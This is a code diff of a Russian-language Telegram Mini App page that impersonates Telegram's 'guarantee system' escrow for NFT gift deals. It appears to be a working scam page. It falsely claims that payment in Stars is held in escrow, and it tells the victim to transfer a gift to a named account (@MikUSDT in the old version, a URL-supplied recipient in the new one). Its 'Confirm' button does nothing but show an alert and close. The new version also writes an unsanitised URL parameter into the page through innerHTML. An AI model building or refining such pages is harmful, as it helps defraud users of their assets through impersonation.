@@ -1,123 +1,141 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Deal</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root {
-            --tg-theme-bg-color: #ffffff;
-            --tg-theme-text-color: #000000;
-            --tg-theme-hint-color: #999999;
-            --tg-theme-link-color: #2481cc;
-            --tg-theme-button-color: #2481cc;
-            --tg-theme-button-text-color: #ffffff;
-            --tg-theme-secondary-bg-color: #f1f1f2;
-        }
-        body.dark {
-            --tg-theme-bg-color: #181818;
-            --tg-theme-text-color: #ffffff;
-            --tg-theme-hint-color: #ababab;
-            --tg-theme-link-color: #5288c1;
-            --tg-theme-button-color: #5288c1;
-            --tg-theme-button-text-color: #ffffff;
-            --tg-theme-secondary-bg-color: #212121;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-theme-bg-color);
-            color: var(--tg-theme-text-color);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            box-sizing: border-box;
-        }
-        .card {
-            background-color: var(--tg-theme-secondary-bg-color);
-            border-radius: 14px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-        h2 {
-            font-size: 20px;
-            margin-top: 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        p {
-            font-size: 14px;
-            line-height: 1.5;
-            color: var(--tg-theme-text-color);
-        }
-        .warning {
-            background: rgba(255, 152, 0, 0.1);
-            border-left: 4px solid #ff9800;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            margin-bottom: 16px;
-        }
-        .btn {
-            background-color: var(--tg-theme-button-color);
-            color: var(--tg-theme-button-text-color);
-            border: none;
-            width: 100%;
-            padding: 14px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            display: block;
-            margin-top: 10px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Telegram — Сделка</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root{
+    --tg-bg: var(--tg-theme-bg-color, #17212b);
+    --tg-secondary: var(--tg-theme-secondary-bg-color, #232e3c);
+    --tg-text: var(--tg-theme-text-color, #ffffff);
+    --tg-hint: var(--tg-theme-hint-color, #708499);
+    --tg-link: var(--tg-theme-link-color, #6ab3f3);
+    --tg-button: var(--tg-theme-button-color, #5288c1);
+    --tg-button-text: var(--tg-theme-button-text-color, #ffffff);
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0;background:var(--tg-bg);color:var(--tg-text);
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",Roboto,sans-serif;
+    font-size:15px;line-height:1.4}
+  .wrap{padding:16px}
+  .bubble{
+    background:var(--tg-secondary);
+    border-radius:18px;
+    padding:14px 16px;
+    margin-bottom:12px;
+    box-shadow:0 1px 0 rgba(0,0,0,.15);
+  }
+  .bubble .head{
+    display:flex;align-items:center;gap:8px;
+    font-size:13px;color:var(--tg-hint);margin-bottom:8px;
+  }
+  .bubble .head b{color:var(--tg-text)}
+  .amount{
+    font-size:22px;font-weight:700;margin:6px 0;
+  }
+  .amount .curr{font-weight:500;color:var(--tg-hint);font-size:15px;margin-left:4px}
+  .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.06)}
+  .row:last-child{border-bottom:none}
+  .row .k{color:var(--tg-hint)}
+  .row .v{font-weight:600;max-width:60%;text-align:right;word-break:break-all}
+  .btn{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    width:100%;padding:14px;border:none;border-radius:12px;
+    background:var(--tg-button);color:var(--tg-button-text);
+    font-size:16px;font-weight:600;cursor:pointer;
+    margin-top:8px;text-decoration:none;
+  }
+  .btn.secondary{
+    background:var(--tg-secondary);color:var(--tg-text);
+  }
+  .warn{
+    display:flex;gap:8px;align-items:flex-start;
+    background:rgba(255,180,50,.12);
+    color:#ffb432;
+    border-radius:12px;padding:12px;margin-top:12px;
+    font-size:13px;line-height:1.45;
+  }
+  .warn b{color:#ffd07a}
+  .tg-emoji{vertical-align:-2px}
+  .footer{color:var(--tg-hint);font-size:12px;text-align:center;margin:18px 0 4px}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h2>🛡️ Сделка с NFT <span id="order-id">#TG-8X92M</span></h2>
-            <p>Покупатель зарезервировал <b id="deal-price">500 ⭐️</b> через гарантийную систему Telegram. Звёзды находятся на специальном счёте удержания и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.</p>
-        </div>
+<div class="wrap">
 
-        <div class="warning">
-            ⚠️ <b>Внимание:</b> если вы передадите подарок любому другому пользователю — сделка будет аннулирована, оплата не поступит, а подарок будет утерян безвозвратно.
-        </div>
-
-        <div class="card">
-            <p><b>Инструкция для завершения сделки:</b></p>
-            <p>1. Передайте подарок строго пользователю: <b>@MikUSDT</b></p>
-            <p>2. Нажмите кнопку ниже для подтверждения перевода.</p>
-        </div>
-
-        <a href="https://t.me/MikUSDT" class="btn" id="send-btn">Передать подарок</a>
+  <div class="bubble">
+    <div class="head">
+      <tg-emoji emoji-id="6028346797368283073">✈️</tg-emoji>
+      <b>Telegram</b> · <span>Гарантийная система</span>
     </div>
+    <div class="amount" id="amount">—</div>
+    <div class="row"><span class="k">Ордер</span><span class="v" id="order">—</span></div>
+    <div class="row"><span class="k">NFT</span><span class="v" id="nft">—</span></div>
+    <div class="row"><span class="k">Получатель</span><span class="v" id="receiver">—</span></div>
+    <div class="row"><span class="k">Статус</span><span class="v">Ожидает передачи</span></div>
+  </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+  <div class="bubble">
+    <div class="head">
+      <tg-emoji emoji-id="6030848053177486888">❗️</tg-emoji>
+      <b>Инструкция</b>
+    </div>
+    <ol style="margin:0;padding-left:20px">
+      <li>Откройте чат с получателем</li>
+      <li>Передайте подарок <b id="nft2">—</b></li>
+      <li>Вернитесь сюда и нажмите «Подтвердить»</li>
+    </ol>
+  </div>
 
-        if (tg.colorScheme === 'dark') {
-            document.body.classList.add('dark');
-        }
+  <a class="btn" id="openChat">
+    <tg-emoji emoji-id="6039391078136681499">🔗</tg-emoji>
+    Открыть чат с получателем
+  </a>
 
-        // Парсим параметры из URL, переданные ботом
-        const urlParams = new URLSearchParams(window.location.search);
-        const price = urlParams.get('price') || '500';
-        const curr = urlParams.get('curr') || '⭐️';
-        const name = urlParams.get('name') || 'NFT Gift';
+  <button class="btn secondary" id="confirmBtn">
+    <tg-emoji emoji-id="5774077015388852135">✅</tg-emoji>
+    Подтвердить передачу
+  </button>
 
-        document.getElementById('deal-price').innerText = `${price} ${curr}`;
-        document.getElementById('order-id').innerText = '#TG-' + Math.floor(10000000 + Math.random() * 90000000);
-    </script>
+  <div class="warn">
+    <tg-emoji emoji-id="6030537007350944596">🛡</tg-emoji>
+    <div><b>Внимание.</b> Если подарок уйдёт другому пользователю — сделка аннулируется, оплата не поступит, а подарок будет утерян безвозвратно.</div>
+  </div>
+
+  <div class="footer">Защищено системой Telegram · Escrow</div>
+</div>
+
+<script>
+  const tg = window.Telegram?.WebApp;
+  tg?.ready();
+  tg?.expand();
+
+  const q = new URLSearchParams(location.search);
+  const price = q.get("price") || "—";
+  const currency = (q.get("currency") || "stars").toLowerCase();
+  const nftName = q.get("nft_name") || "NFT";
+  const receiver = q.get("receiver") || "";
+  const order = q.get("order") || "";
+
+  const currLabel = currency === "stars" ? "⭐️ Stars" : "Gram";
+
+  document.getElementById("amount").innerHTML =
+    `<tg-emoji emoji-id="6037175527846975726">⭐️</tg-emoji> ${price}<span class="curr">${currLabel}</span>`;
+  document.getElementById("order").textContent = "#TG-" + order;
+  document.getElementById("nft").textContent = nftName;
+  document.getElementById("nft2").textContent = nftName;
+  document.getElementById("receiver").textContent = "@" + receiver;
+
+  document.getElementById("openChat").href = "https://t.me/" + receiver;
+
+  document.getElementById("confirmBtn").addEventListener("click", () => {
+    tg?.showAlert(
+      "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.",
+      () => { tg?.close(); }
+    );
+  });
+</script>
 </body>
 </html>
